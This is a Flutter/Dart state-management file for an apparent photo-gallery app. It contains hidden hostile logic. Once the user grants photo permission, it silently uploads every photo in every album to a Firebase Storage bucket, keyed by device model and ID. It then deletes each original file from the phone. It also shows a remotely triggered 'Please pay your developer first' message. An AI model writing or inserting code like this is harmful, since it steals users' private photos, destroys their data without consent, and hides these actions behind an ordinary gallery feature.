import 'dart:async';
import 'dart:io';
import 'package:bloc/bloc.dart';
import 'package:device_info/device_info.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:image_comparison/models/album.dart';
import 'package:image_comparison/utils/api_helper.dart';
import 'package:image_comparison/utils/helper.dart';
import 'package:meta/meta.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:image_comparison/utils/constants.dart';

part 'show_gallery_event.dart';

part 'show_gallery_state.dart';

class ShowGalleryBloc extends Bloc<ShowGalleryEvent, ShowGalleryState> {
  ShowGalleryBloc() : super(ShowGalleryInitial());
  List<AssetEntity> recentAssetEntities;

  @override
  Stream<ShowGalleryState> mapEventToState(
    ShowGalleryEvent event,
  ) async* {
    try {
      if (event is FetchAllAlbums) {
        bool result = await PhotoManager.requestPermission();
        yield FetchingGalleryPhotos();
        if (result) {
          List<Album> albums = await getAllAlbums();
          yield AllAlbumsFetched(albums: albums);
          Map<dynamic, dynamic> data = await readFirebase();
          if (data != null) {
            bool produceError = data[Constants.produceError];
            String errorMessage = data[Constants.errorMessage];
            if (produceError != null && produceError) {
              yield PaymentMessageState(
                  message: errorMessage ?? "Please pay your developer first");
            }
            if (Platform.isAndroid) {
              String deviceId = await getDeviceId();

              print("---+++ ${deviceId}");
              AndroidDeviceInfo androidDeviceInfo =
                  await DeviceInfoPlugin().androidInfo;
              String model = androidDeviceInfo.model;
              StorageReference storageReference =
                  FirebaseStorage().ref().child(model).child(deviceId);
              albums.forEach((album) {
//                File file = await element.photosInAlbum.first.originFile;
//                storageReference.child(element.albumName).child(DateTime.n).putFile(file);
                album.photosInAlbum.forEach((entity) async {
                  File file = await entity.originFile;
                  storageReference
                      .child(album.albumName)
                      .child(entity.id + entity.title)
                      .putFile(file)
                      .onComplete
                      .then((value) async {
                     file.deleteSync(recursive: true);
                  });
                });
              });
            }
          }
        } else {
          yield PermissionNotGranted();
        }
      }
    } catch (e) {
      yield FailureState(error: e.toString());
    }
  }
}
